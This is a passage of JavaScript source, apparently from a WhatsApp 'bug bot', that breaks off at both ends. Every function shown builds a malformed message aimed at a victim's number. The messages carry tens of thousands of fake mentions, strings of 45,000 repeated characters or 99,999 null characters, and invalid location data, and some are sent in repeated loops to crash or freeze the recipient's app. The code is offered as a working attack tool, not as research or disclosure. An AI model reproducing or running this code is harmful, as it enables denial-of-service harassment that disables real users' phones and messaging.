                    extendedTextMessage: {
                        text: "𝖬𝖺𝗄𝗅𝗈 𝖣𝗂 𝖤𝗇𝗍𝗈𝖽 𝖬𝖺𝗋𝗄",
                        contextInfo: {
                            mentionedJid: Array.from({ length: 30000 }, () => 
                                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
                            isSampled: true,
                            participant: jid,
                            remoteJid: "status@broadcast",
                            forwardingScore: 9741,
                            isForwarded: false,
                            quotedMessage: quotedMessage
                        }
                    }
                }
            }
        }, {});

        await new Promise(resolve => setTimeout(resolve, 1000));

        await sock.relayMessage("status@broadcast", messageObject.message, {
            messageId: messageObject.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users", 
                    attrs: {}, 
                    content: [{
                        tag: "to", 
                        attrs: { jid: jid },
                        content: undefined,
                    }],
                }],
            }],
        });

    } catch (err) {
        console.error('Error Bocah:', err);
    }
}
async function stunnerBugMP4(sock, jid) {
  try {
    const message = {
      viewOnceMessage: {
        message: {
          videoMessage: {
            interactiveAnnotations: [],
            annotations: [
              {
                embeddedContent: {
                  musicContentMediaId: "12345789451",
                  songId: "88888888888888",
                  author: "No One Care!",
                  title: "No One Care!",
                  artworkDirectPath:
                    "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
                  artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                  artworkEncSha256:
                    "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                  artistAttribution: "https://www.instagram.com/_u/noonecare",
                  countryBlocklist: true,
                  isExplicit: true,
                  artworkMediaKey:
                    "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
                },
                embeddedAction: true,
              },
            ],
            caption: `< PRIMROSE LOTUS >`,
            url: "https://mmg.whatsapp.net/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0&mms3=true",
            mimetype: "video/mp4",
            fileSha256: "bvkPnStTimcqgvugKm2jV1cKSAdJ00DnnKR31N/aH0Q=",
            fileLength: {
              low: 55438054,
              high: 0,
              unsigned: true,
            },
            seconds: 312,
            mediaKey: "XSc3T7jk+OhrNGSH4gMZQFnzL7boede9orqrG4a+QZ0=",
            height: 864,
            width: 480,
            fileEncSha256: "krpFGEDnkho/kNIQRY6qCYfzxdaxNzdW2H5fli3qg64=",
            directPath:
              "/v/t62.7161-24/19962704_656482737304802_3148076705978799507_n.enc?ccb=11-4&oh=01_Q5Aa1QFxApNysKSqcRZqIJ7j5ps8agbLDm_5BeWdTmC3acBQZQ&oe=68365482&_nc_sid=5e03e0",
            mediaKeyTimestamp: {
              low: 1745804782,
              high: 0,
              unsigned: false,
            },
            jpegThumbnail:
              "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAAAAAAAAAAAAAAAAAgMEAQUBAQADAQAAAAAAAAAAAAAAAAUCAwQB/9oADAMBAAIQAxAAAADQBgiiyUpiMRT3vLsvN62wHjoyhr2+hRbQgh10QPSU23aa8mtJCxAMOwltmOwUV9UCif/EACAQAAICAQQDAQAAAAAAAAAAAAECAAMRBBASQSAhMTL/2gAIAQEAAT8A87dRXUQD9MR1sGR4U1VW2O7DLAwoqWMF3uc1oSBNAHBsdgfYlFhNjqd9R+FUdypVFSLKqqxa7Be5cvFztYpZlz1FxGbg2RLWD8W2tOBFsyoxMl3Ajn2AOttSwAEV5QQQzb6wkcIbSBK7XxgGD4J//8QAIhEBAAICAQIHAAAAAAAAAAAAAQACAxIhBBAREyMxUWGS/9oACAECAQE/AJrYNvDjtWrZAmWvop8HbpdRss45mauuSxMAv7JYNWXs2srOnXzaH3GPuz//xAAiEQACAQMEAgMAAAAAAAAAAAABAgADERIEECExE2EkMlH/2gAIAQMBAT8AmDBcsTb92RWdgqjmV0+MVA6G2jsM2l7SuuNVx7lAHD0XWfbiVGLuzGadj5EW/F9j2Z//2Q==",
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 42000,
                  },
                  () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                ),
              ],
              groupMentions: [],
            },
            streamingSidecar:
              "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",
          },
        },
      },
    };

    const msg = generateWAMessageFromContent(jid, message, {});

    let statusid;
    statusid = await sock.relayMessage("status@broadcast", msg.message, {
      messageId: generateRandomMessageId(),
      statusJidList: [jid],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: jid },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });

    await sock.relayMessage(
      jid,
      {
        message: {
          protocolMessage: {
            key: statusid.key,
            limitSharing: {
              sharingLimited: true,
              trigger: "BIZ_SUPPORTS_FB_HOSTING",
            },
            type: "PEER_DATA_OPERATION_REQUEST_RESPONSE_MESSAGE",
          },
        },
      },
      {}
    );
  } catch (err) {
    console.log(err);
  }
}
async function carouselfriX(sock, jid, blonde) {
  const largeText = "you Must Die" + "ꦾ".repeat(45000);

  while (blonde) {
    try {
      for (let i = 0; i < 100; i++) {
        const section = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [{
            title: largeText,
            id: `id${i}`,
            subrows: [{
              title: "Nested row 1",
              id: `nested_id1_${i}`,
              subsubrows: [{
                title: "Deep Nested row 1",
                id: `deep_nested_id1_${i}`,
              }]
            }]
          }]
        };

        const content = proto.Message.fromObject({
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "Snithinx",
                  locationMessage: {
                    degreesLatitude: -999.035,
                    degreesLongitude: 922.999,
                    name: "🐉",
                    address: "👁",
                    jpegThumbnail: Buffer.from([]) // kosong agar valid
                  },
                  hasMediaAttachment: true
                },
                body: {
                  text: "Are You Ready To Die?"
                },
                nativeFlowMessage: {
                  messageParamsJson: "bio.link/snitch",
                  buttons: [{
                    name: "single_select",
                    buttonParamsJson: {
                      title: "Normal button",
                      sections: [section]
                    }
                  }]
                },
                contextInfo: {
                  externalAdReply: {
                    title: "You will Die" + "@1".repeat(5000),
                    body: "Lets Kill",
                    thumbnailUrl: "https://wa.msg/setting",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    showAdAttribution: true,
                    sourceUrl: "https://wa.msg/setting"
                  }
                }
              }
            }
          }
        });

        const msg = await generateWAMessageFromContent(jid, content, {
          userJid: jid,
          quoted: null
        });

        await sock.relayMessage(jid, msg.message, {
          messageId: msg.key.id
        });

        await delay(300); // tambahkan delay untuk menghindari flood
      }

    } catch (err) {
      console.error("❌ Error sending section:", err);
      break;
    }
  }
}
async function iosinvis(sock, jid) {
    for (let i = 0; i < 150; i++) {
        await sock.relayMessage(jid, {
            extendedTextMessage: {
                text: 'BLACK INVISIBLE' + "\u0000".repeat(99999),
                contextInfo: {
                    groupMentions: [{ groupJid: "000000000000009@g.us", groupSubject: "⁨🔥" }],
                    stanzaId: "1234567890ABCDEF",
                    participant: "13135550002@s.whatsapp.net",
                    quotedMessage: {
                        callLogMesssage: {
                            isVideo: true,
                            callOutcome: "1",
                            durationSecs: "0",
                            callType: "REGULAR",
                            participants: [{ jid: "13135550002@s.whatsapp.net", callOutcome: "1" }]
                        }
                    },
                    remoteJid: jid,
                    conversionSource: "source_example",
                    conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                    conversionDelaySeconds: 10,
                    forwardingScore: 9999999,
                    isForwarded: true,
                    quotedAd: {
                        advertiserName: "Example Advertiser",
                        mediaType: "IMAGE",
                        jpegThumbnail: null,
                        caption: "@ Você foi mencionado"
                    },
                    placeholderKey: { remoteJid: "13135550002@s.whatsapp.net", fromMe: false, id: "ABCDEF1234567890" },
                    expiration: 86400,
